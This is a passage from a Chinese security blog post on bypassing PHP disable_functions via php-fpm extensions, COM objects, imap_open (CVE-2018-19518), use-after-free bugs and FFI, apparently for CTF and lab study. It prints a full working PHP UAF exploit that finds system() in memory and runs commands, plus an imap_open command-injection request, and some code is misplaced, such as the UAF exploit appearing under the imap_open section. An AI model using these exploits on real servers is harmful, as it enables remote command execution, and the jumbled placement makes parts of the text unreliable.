so 文件可以从项目中获取，根据其提示编译即可获取 ant.so 的库，修改 php-fpm 的 php.ini，加入：

```
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

然后重启 php-fpm，如果使用如下:

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1rq7ZpCCKKNYmvdLoszybCt5KicN6qlG27YBb55EhOwEnSsCUiagAoMlQ/640?wx_fmt=png)

成功执行命令时即说明扩展成功加载，那么我们再把 ini 恢复为先前的样子，我们尝试直接攻击 php-fpm 来修改其配置项。

以脚本来攻击:

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo19QKATdXT4Q2bYiaoQyw1oMTI0U3EQqJpy0mLVv6QicuEWYL5Ceduo7OA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1eicDk0Tfp7kSSftKa6VKaWjvS8hxdhv8lwTAj0xryh9Dcb9vRaFf60w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1Itg6qwEGoLErm3625NhwdhYlCl8ApGfVsf4hr36AKVVahh1EgJaPog/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo15DYEp2J01ibJazWC1fcYk8X6qdVUycsH5os5owzsWufn9awqcj8IPlw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1qF6sECJ6ltr7kNZJRCNwWGngA92Rb6Urs1RC5xwQJI2TOHLc0Ts36g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1bvmGc1o1WO82zEASczHFCTZcSaVYEW93S38eCxiaeibqQppd2wdf5jSA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1C0cOOs9jViabHKEfd9Clk2z9a8QIz9NyQjmkRsDiaNeaNfCnwxubwT6Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1pDDPicpEicrV5p56AS7lo6V4GEesZZZGvHz3f8jAJq5KxsLiaCodDVICg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo10axGGUEal1y53Qdl5RKHElEc4Qczu6icuKxyqKvxRpTjiagU7xtfUDEw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1GYCfcH9FiczGrmxicoeZV0ia6xbicaFxU0uAQmiaLf985LXfCPNqgV0t3vg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1wushfbibz1HAqAzHpZibvy3qQofu0fDm4L3J8b8syWnOCWn1rsofofCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1H2fqGFNnBs5PU0JmK7Rs26FltlkySbtndSBrrLiaian9OyIx61jv3n8g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1jjc6ISgicBYERcX26MIt87T89SgKW4OMJteje8nTPWpCb5aibxK2INWA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1FX0GnetJq0GT3tk6fNGtQZFurvoiboHDDjazG222Z7eYkw8UQ9sdjAg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo18P6icD8cf8AaiaNt7BQXJn2H3L9z0UFibNQjDHuhFqBzRbplZicoDu7DcA/640?wx_fmt=png)

通过修改其内的 code 即可，效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo13awXl8061iaiaiba1Z9TadmL1EsKCsmqqUnumC6oa1gJ7hUROBwh5sX8g/640?wx_fmt=png)

漏洞利用成功。

### com 组件

#### 原理 & 利用

需要目标机器满足下列三个条件：

*   com.allow_dcom = true
    
*   extension=php_com_dotnet.dll
    
*   php>5.4
    

此时 com 组件开启，我们能够在 phpinfo 中看到：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1hNCCnx1PWOA1EhGTdicEiclcrHIIY70iaIYe0iayt6HStUr5vZbgKeBzBg/640?wx_fmt=png)

要知道原理还是直接从 exp 看起：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1LVqeGxibQGxZyG79WDVLGzklcDR1p1GfBxYMXGcQJnxiciapke037gPGg/640?wx_fmt=png)

首先，以`new COM('WScript.shell')`来生成一个 com 对象，里面的参数也可以为`Shell.Application`（笔者的 win10 下测试失败）。

然后这个 com 对象中存在着 exec 可以用来执行命令，而后续的方法则是将命令输出，该方式的利用还是较为简单的，就不多讲了。

### imap_open

该 bypass 方式为 CVE-2018-19518

#### 原理

imap 扩展用于在 PHP 中执行邮件收发操作，而 imap_open 是一个 imap 扩展的函数，在使用时通常以如下形式：

```
hostname=x+-oProxyCommand%3decho%09bHM%2BdGVzdAo%3D|base64%09-d|sh}&username=111&password=222
//ls>test
```

那么该函数在调用时会调用 rsh 来连接远程 shell，而在 debian/ubuntu 中默认使用 ssh 来代替 rsh 的功能，也即是说在这俩系统中调用的实际上是 ssh，而 ssh 中可以通过`-oProxyCommand=`来调用命令，该选项可以使得我们在连接服务器之前先执行命令，并且需要注意到的是此时并不是 php 解释器在执行该系统命令，其以一个独立的进程去执行了该命令，因此我们也就成功的 bypass disable function 了。

那么我们可以先在 ubuntu 上试验一下：

```
<?php
error_reporting(0);
$a = str_repeat("T", 120 * 1024 * 1024);
function i2s(&$a, $p, $i, $x = 8) {
    for($j = 0;$j < $x;$j++) {
        $a[$p + $j] = chr($i & 0xff);
        $i >>= 8;
    }
}

function s2i($s) {
    $result = 0;
    for ($x = 0;$x < strlen($s);$x++) {
        $result <<= 8;
        $result |= ord($s[$x]);
    }
    return $result;
}

function leak(&$a, $address) {
    global $s;
    i2s($a, 0x00, $address - 0x10);
    return strlen($s -> current());
}

function getPHPChunk($maps) {
    $pattern = '/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /';
    preg_match_all($pattern, $maps, $match);
    foreach ($match[1] as $value) {
        list($start, $end) = explode("-", $value);
        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) >= 0x200000 && $length <= 0x300000) {
            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);
            echo "[+]PHP Chunk: " . $start . " - " . $end . ", length: 0x" . dechex($length) . "\n";
            return $address;
        }
    }
}

function bomb1(&$a) {
    if (leak($a, s2i($_GET["test1"])) === 0x5454545454545454) {
        return (s2i($_GET["test1"]) & 0x7ffff0000000);
    }else {
        die("[!]Where is here");
    }
}

function bomb2(&$a) {
    $start = s2i($_GET["test2"]);
    return getElement($a, array($start, $start + 0x200000, 0x200000));
    die("[!]Not Found");
}

function getElement(&$a, $address) {
    for ($x = 0;$x < ($address[2] / 0x1000 - 2);$x++) {
        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;
        for ($y = 0;$y < 5;$y++) {
            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 && ((leak($a, $addr + $y * 0x08 - 0x08) & 0xffffffff) === 0x01)){
                echo "[+]SplDoublyLinkedList Element: " . dechex($addr + $y * 0x08 - 0x18) . "\n";
                return $addr + $y * 0x08 - 0x18;
            }
        }
    }
}

function getClosureChunk(&$a, $address) {
    do {
        $address = leak($a, $address);
    }while(leak($a, $address) !== 0x00);
    echo "[+]Closure Chunk: " . dechex($address) . "\n";
    return $address;
}

function getSystem(&$a, $address) {
    $start = $address & 0xffffffffffff0000;
    $lowestAddr = ($address & 0x0000fffffff00000) - 0x0000000001000000;
    for($i = 0; $i < 0x1000 * 0x80; $i++) {
        $addr = $start - $i * 0x20;
        if ($addr < $lowestAddr) {
            break;
        }
        $nameAddr = leak($a, $addr);
        if ($nameAddr > $address || $nameAddr < $lowestAddr) {
            continue;
        }
        $name = dechex(leak($a, $nameAddr));
        $name = str_pad($name, 16, "0", STR_PAD_LEFT);
        $name = strrev(hex2bin($name));
        $name = explode("\x00", $name)[0];
        if($name === "system") {
            return leak($a, $addr + 0x08);
        }
    }
}

class Trigger {
    function __destruct() {
        global $s;
        unset($s[0]);
        $a = str_shuffle(str_repeat("T", 0xf));
        i2s($a, 0x00, 0x1234567812345678);
        i2s($a, 0x08, 0x04, 7);
        $s -> current();
        $s -> next();
        if ($s -> current() !== 0x1234567812345678) {
             die("[!]UAF Failed");
        }
        $maps = file_get_contents("/proc/self/maps");
        if (!$maps) {
            cantRead($a);
        }else {
            canRead($maps, $a);
        }
        echo "[+]Done";
    }
}

function bypass($elementAddress, &$a) {
    global $s;
    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {
        die("[!]Get Closure Chunk Address Failed");
    }
    $closure_object = leak($a, $closureChunkAddress + 0x18);
    echo "[+]Closure Object: " . dechex($closure_object) . "\n";
    $closure_handlers = leak($a, $closure_object + 0x18);
    echo "[+]Closure Handler: " . dechex($closure_handlers) . "\n";
    if(!($system_address = getSystem($a, $closure_handlers))) {
        die("[!]Couldn't determine system address");
    }
    echo "[+]Find system's handler: " . dechex($system_address) . "\n";
    i2s($a, 0x08, 0x506, 7);
    for ($i = 0;$i < (0x130 / 0x08);$i++) {
        $data = leak($a, $closure_object + 0x08 * $i);
        i2s($a, 0x00, $closure_object + 0x30);
        i2s($s -> current(), 0x08 * $i + 0x100, $data);
    }
    i2s($a, 0x00, $closure_object + 0x30);
    i2s($s -> current(), 0x20, $system_address);
    i2s($a, 0x00, $closure_object);
    i2s($a, 0x08, 0x108, 7);
    echo "[+]Executing command: \n";
    ($s -> current())("php -v");
}

function canRead($maps, &$a) {
    global $s;
    if (!$chunkAddress = getPHPChunk($maps)) {
        die("[!]Get PHP Chunk Address Failed");
    }
    i2s($a, 0x08, 0x06, 7);
    if (!$elementAddress = getElement($a, $chunkAddress)) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}

function cantRead(&$a) {
    global $s;
    i2s($a, 0x08, 0x06, 7);
    if (!isset($_GET["test1"]) && !isset($_GET["test2"])) {
        die("[!]Please try to get address of PHP Chunk");
    }
    if (isset($_GET["test1"])) {
        die(dechex(bomb1($a)));
    }
    if (isset($_GET["test2"])) {
        $elementAddress = bomb2($a);
    }
    if (!$elementAddress) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}

$s = new SplDoublyLinkedList();
$s -> push(new Trigger());
$s -> push("Twings");
$s -> push(function($x){});
for ($x = 0;$x < 0x100;$x++) {
    $s -> push(0x1234567812345678);
}
$s -> rewind();
unset($s[0]);
```

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1vJic8uFBiaK4aYm2PgRyiaLyBt4esH7PcRKqMBHHqzTeB0khEfRwDQibTQ/640?wx_fmt=png)

#### 利用

环境的话 vulhub 上有，其中给出了 poc：

```
POST / HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222
```

我们可以发现其中使用了 %09 来绕过空格，以 base64 的形式来执行我们的命令，那么我这里再验证一下：

```
hostname=x+-oProxyCommand%3decho%09bHM%2BdGVzdAo%3D|base64%09-d|sh}&username=111&password=222
//ls>test
```

会发现成功写入了一个 test，漏洞利用成功，那么接下来就是各种肆意妄为了。

### 三种 UAF

EXP 在：https://github.com/mm0r1/exploits

三种 uaf 分别是：

*   Json Serializer UAF
    
*   GC UAF
    
*   Backtrace UAF
    

关于 uaf 的利用因为涉及到二进制相关的知识，而笔者是个 web 狗，因此暂时只会用 exp 打打，因此这里就不多说，就暂时先稍微提一下三种 uaf 的利用版本及其概述 // 其实我就是照搬了 exp 里面的说明，读者可以看 exp 作者的说明就行了。

#### Json Serializer UAF

漏洞出现的版本在于：

*   7.1 - all versions to date
    
*   7.2 <7.2.19 (released: 30 May 2019)
    
*   7.3 <7.3.6 (released: 30 May 2019)
    

漏洞利用 json 在序列化中的堆溢出触发 bypass，漏洞为 bug #77843

#### GC UAF

漏洞出现的版本在于：

*   7.0 - all versions to date
    
*   7.1 - all versions to date
    
*   7.2 - all versions to date
    
*   7.3 - all versions to date
    

漏洞利用的是 php garbage collector（垃圾收集器）程序中的堆溢出达成 bypass，漏洞为：bug #72530

#### Backtrace UAF

漏洞出现的版本在于：

*   7.0 - all versions to date
    
*   7.1 - all versions to date
    
*   7.2 - all versions to date
    
*   7.3 <7.3.15 (released 20 Feb 2020)
    
*   7.4 <7.4.3 (released 20 Feb 2020)
    

漏洞利用的是 debug_backtrace 这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为 bug #76047

#### 利用

利用的话 exp 或者蚁剑上都有利用插件了，这里不多讲，可以上 ctfhub 测试。

### SplDoublyLinkedList UAF

#### 概述

这个 UAF 是在先知上看到的，引用原文来概述：

> 可以看到，删除元素的操作被放在了置空 traverse_pointer 指针前。
> 
> 所以在删除一个对象时，我们可以在其构析函数中通过 current 访问到这个对象，也可以通过 next 访问到下一个元素。如果此时下一个元素已经被删除，就会导致 UAF。
> 
> PHP 部分（仅在 7.4.10、7.3.22、7.2.34 版本测试）

#### exp

exp 同样出自原文。

php 部分：

```
<?php
error_reporting(0);
$a = str_repeat("T", 120 * 1024 * 1024);
function i2s(&$a, $p, $i, $x = 8) {
    for($j = 0;$j < $x;$j++) {
        $a[$p + $j] = chr($i & 0xff);
        $i >>= 8;
    }
}
function s2i($s) {
    $result = 0;
    for ($x = 0;$x < strlen($s);$x++) {
        $result <<= 8;
        $result |= ord($s[$x]);
    }
    return $result;
}
function leak(&$a, $address) {
    global $s;
    i2s($a, 0x00, $address - 0x10);
    return strlen($s -> current());
}
function getPHPChunk($maps) {
    $pattern = '/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /';
    preg_match_all($pattern, $maps, $match);
    foreach ($match[1] as $value) {
        list($start, $end) = explode("-", $value);
        if (($length = s2i(hex2bin($end)) - s2i(hex2bin($start))) >= 0x200000 && $length <= 0x300000) {
            $address = array(s2i(hex2bin($start)), s2i(hex2bin($end)), $length);
            echo "[+]PHP Chunk: " . $start . " - " . $end . ", length: 0x" . dechex($length) . "\n";
            return $address;
        }
    }
}
function bomb1(&$a) {
    if (leak($a, s2i($_GET["test1"])) === 0x5454545454545454) {
        return (s2i($_GET["test1"]) & 0x7ffff0000000);
    }else {
        die("[!]Where is here");
    }
}
function bomb2(&$a) {
    $start = s2i($_GET["test2"]);
    return getElement($a, array($start, $start + 0x200000, 0x200000));
    die("[!]Not Found");
}
function getElement(&$a, $address) {
    for ($x = 0;$x < ($address[2] / 0x1000 - 2);$x++) {
        $addr = 0x108 + $address[0] + 0x1000 * $x + 0x1000;
        for ($y = 0;$y < 5;$y++) {
            if (leak($a, $addr + $y * 0x08) === 0x1234567812345678 && ((leak($a, $addr + $y * 0x08 - 0x08) & 0xffffffff) === 0x01)){
                echo "[+]SplDoublyLinkedList Element: " . dechex($addr + $y * 0x08 - 0x18) . "\n";
                return $addr + $y * 0x08 - 0x18;
            }
        }
    }
}
function getClosureChunk(&$a, $address) {
    do {
        $address = leak($a, $address);
    }while(leak($a, $address) !== 0x00);
    echo "[+]Closure Chunk: " . dechex($address) . "\n";
    return $address;
}
function getSystem(&$a, $address) {
    $start = $address & 0xffffffffffff0000;
    $lowestAddr = ($address & 0x0000fffffff00000) - 0x0000000001000000;
    for($i = 0; $i < 0x1000 * 0x80; $i++) {
        $addr = $start - $i * 0x20;
        if ($addr < $lowestAddr) {
            break;
        }
        $nameAddr = leak($a, $addr);
        if ($nameAddr > $address || $nameAddr < $lowestAddr) {
            continue;
        }
        $name = dechex(leak($a, $nameAddr));
        $name = str_pad($name, 16, "0", STR_PAD_LEFT);
        $name = strrev(hex2bin($name));
        $name = explode("\x00", $name)[0];
        if($name === "system") {
            return leak($a, $addr + 0x08);
        }
    }
}
class Trigger {
    function __destruct() {
        global $s;
        unset($s[0]);
        $a = str_shuffle(str_repeat("T", 0xf));
        i2s($a, 0x00, 0x1234567812345678);
        i2s($a, 0x08, 0x04, 7);
        $s -> current();
        $s -> next();
        if ($s -> current() !== 0x1234567812345678) {
             die("[!]UAF Failed");
        }
        $maps = file_get_contents("/proc/self/maps");
        if (!$maps) {
            cantRead($a);
        }else {
            canRead($maps, $a);
        }
        echo "[+]Done";
    }
}
function bypass($elementAddress, &$a) {
    global $s;
    if (!$closureChunkAddress = getClosureChunk($a, $elementAddress)) {
        die("[!]Get Closure Chunk Address Failed");
    }
    $closure_object = leak($a, $closureChunkAddress + 0x18);
    echo "[+]Closure Object: " . dechex($closure_object) . "\n";
    $closure_handlers = leak($a, $closure_object + 0x18);
    echo "[+]Closure Handler: " . dechex($closure_handlers) . "\n";
    if(!($system_address = getSystem($a, $closure_handlers))) {
        die("[!]Couldn't determine system address");
    }
    echo "[+]Find system's handler: " . dechex($system_address) . "\n";
    i2s($a, 0x08, 0x506, 7);
    for ($i = 0;$i < (0x130 / 0x08);$i++) {
        $data = leak($a, $closure_object + 0x08 * $i);
        i2s($a, 0x00, $closure_object + 0x30);
        i2s($s -> current(), 0x08 * $i + 0x100, $data);
    }
    i2s($a, 0x00, $closure_object + 0x30);
    i2s($s -> current(), 0x20, $system_address);
    i2s($a, 0x00, $closure_object);
    i2s($a, 0x08, 0x108, 7);
    echo "[+]Executing command: \n";
    ($s -> current())("php -v");
}
function canRead($maps, &$a) {
    global $s;
    if (!$chunkAddress = getPHPChunk($maps)) {
        die("[!]Get PHP Chunk Address Failed");
    }
    i2s($a, 0x08, 0x06, 7);
    if (!$elementAddress = getElement($a, $chunkAddress)) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}
function cantRead(&$a) {
    global $s;
    i2s($a, 0x08, 0x06, 7);
    if (!isset($_GET["test1"]) && !isset($_GET["test2"])) {
        die("[!]Please try to get address of PHP Chunk");
    }
    if (isset($_GET["test1"])) {
        die(dechex(bomb1($a)));
    }
    if (isset($_GET["test2"])) {
        $elementAddress = bomb2($a);
    }
    if (!$elementAddress) {
        die("[!]Get SplDoublyLinkedList Element Address Failed");
    }
    bypass($elementAddress, $a);
}
$s = new SplDoublyLinkedList();
$s -> push(new Trigger());
$s -> push("Twings");
$s -> push(function($x){});
for ($x = 0;$x < 0x100;$x++) {
    $s -> push(0x1234567812345678);
}
$s -> rewind();
unset($s[0]);
```

python 部分：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo15QjXeXDaw4qtZfaMWrUOJmY90Ve6kn10UEy65prhgFpvgYq92oa9Fw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1aKvLhdYsBdPmUCBlmiabNf71ibnxNzcw7nwZ9Nj4BynJ32AuG0QUEKVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1dLXzu0c6c6TEXmicGK6aDaIAp0pswgdxSA0icfOVh4OcvZ6DpQgTS0icg/640?wx_fmt=png)

### ffi 扩展

ffi 扩展笔者初见于 TCTF/0CTF 2020 中的 easyphp，当时是因为非预期解拿到 flag 发现了 ffi 三个字母才了解到 php7.4 中多了 ffi 这种东西。

#### 原理

PHP FFI（Foreign Function interface），提供了高级语言直接的互相调用，而对于 PHP 而言，FFI 让我们可以方便的调用 C 语言写的各种库。

也即是说我们可以通过 ffi 来调用 c 语言的函数从而绕过 disable 的限制，我们可以简单使用一个示例来体会一下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1bqZrDkvPZxH7qadj85oqZc2SpmtpEQ1qnK8NqlZpu9rLKo6PKM1N6Q/640?wx_fmt=png)

输出如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1WG8RicpCH7ENdsG0U8DibeWJDwToZiczMeLW0s3JUwWCKbndYNM3c7fNw/640?wx_fmt=png)

那么这种利用方式可能出现的场景还不是很多，因此笔者稍微讲解一下。

首先是 cdef：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1M5x0hjficUA3A5yuib0zXRsNtKJ5uJLiapnLN9otBPOKiaYSKwfPFgsMIA/640?wx_fmt=png)

这一行是创建一个 ffi 对象，默认就会加载标准库，以本行为例是导入 system 这个函数，而这个函数理所当然是存在于标准库中，那么我们若要导入库时则可以以如下方式：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1NBcAeC0ATkDVv6k4JEibPOMakMObKmBwqXYsk0qI9OPbsOwMtsgMqLA/640?wx_fmt=png)

可以看看其函数原型：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1HSDdr0glgf9c8nLeV7pgbReIESS0icQMxA8wnVNZULka4bnuv9NJ5sA/640?wx_fmt=png)

取得了 ffi 对象后我们就可以直接调用函数了：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo10RA0iaIk5qZex7bFXEgVjib2TewCProUXSmclicvAlzuLxjHeQImgAPEA/640?wx_fmt=png)

之后的代码较为简单就不多讲，那么接下来看看实际应用该从哪里入手。

#### 利用

以 tctf 的题目为例，题目直接把 cdef 过滤了，并且存在着 basedir，但我们可以使用之前说过 bypass basedir 来列目录，逐一尝试能够发现可以使用 glob 列根目录目录：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo11UsiaElf7Fn2y3UrKSicLophAO0DxF0xwwy2ZV1058KicjSWB3lPCG1nw/640?wx_fmt=png)

可以发现根目录存在着 flag.h 跟 so：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1VtLIOdSYGFV135icic4JTI5qNeG0voUrdHIVf1NuicorW4kMMZ7exFLCQ/640?wx_fmt=png)

因为后面环境没有保存，笔者这里简单复述一下当时题目的情况（仅针对预期解）。

发现了 flag.h 之后查看 ffi 相关文档能够发现一个 load 方法可以加载头文件。

于是有了如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo13VWIdxXUyicPdkJVlkicnhv0C2Ste4E5d0ZfN4qmEFaHcWfKcVefZfDA/640?wx_fmt=png)

但当我们想要打印头文件来获取其内存在的函数时会尴尬的发现如下：

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1HsWhQT1v1g3VLHc7h0aJ8d6lKbU1FQEeufKPPibfxA6ztwGonkWMYibA/640?wx_fmt=png)

我们无法获取到存在的函数结构，因此也就无法使用 ffi 调用函数，这一步路就断了，并且 cdef 也被过滤了，无法直接调用 system 函数，但查看文档能够发现 ffi 中存在着不少与内存相关的函数，因此存在着内存泄露的可能，这里借用飘零师傅的 exp:

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1Guy3qlFVSvOKib3rJY0iaKib0ezEctrKcRoKicrkyMg79Ib0dalza0rRoA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1p65By0PrhPEALks0kelAGraFicGw3lWz3iamVH8ZDnN9w9nUHNh8Vqww/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1jVibfFV1jXxwFYwoOHuG83txAibGAZ39piajA1oZ6M2U2KBVZrbOEvSNQ/640?wx_fmt=png)

获取到函数名后直接调用函数然后把结果打印出来即可：  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LdjR8YWdGpLyQtyRR8duCo1CW90qv6ibyG90dTlibGyqY40rribicPlPZHOkgWRM1ua13B3ibIET2bWWow/640?wx_fmt=png)

**12/25**

欢迎投稿至邮箱：**EDU@antvsion.com**  

了解稿件投递相关

请点击公众号菜单：【来撩我吧】- 原创征集

有才能的你快来投稿吧！

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LdRmpz4ibIY8GpicEiabmEOVuDH643dgKUQ7JK7bkJibUEk8bImjXrQgvtr4MZpMnfVuw7aT2KRkdFJrw/640?wx_fmt=gif)

快戳 “阅读原文” 做实验